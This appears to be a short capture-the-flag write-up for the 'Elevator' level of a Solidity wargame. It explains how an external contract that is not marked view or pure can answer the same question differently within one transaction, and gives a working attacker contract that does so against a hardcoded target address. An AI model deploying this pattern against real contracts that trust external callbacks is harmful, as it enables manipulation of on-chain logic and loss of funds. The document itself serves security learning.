# Level 11 - Elevator

- You can use the `view` function modifier on an interface in order to prevent state modifications. The `pure` modifier also prevents functions from modifying the state. Make sure you read [Solidity's documentation](http://solidity.readthedocs.io/en/develop/contracts.html#view-functions) and learn its caveats.
- An alternative way to solve this level is to build a view function which returns different results depends on input data but don't modify state, e.g. `gasleft()`.
- I have created a contract with specified function and let contract call that function. Normally, this wouldn’t be a problem if pure or view is used. Because that way I wouldn’t be able to give different results in same transaction.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IElevator {
    function goTo(uint256 _floor) external;
}

contract ElevatorAttacker {
    bool entered = false;
    address target = 0x7a611241B681187a240798bc25a7d24d20Dfd7B8;

    function isLastFloor(uint256 _floor) external returns (bool s) {
        if(entered) {
            return true;
        }
        else {
            entered = true;
        }
    }

    function attack() public {
        IElevator(target).goTo(1);
    }
}
```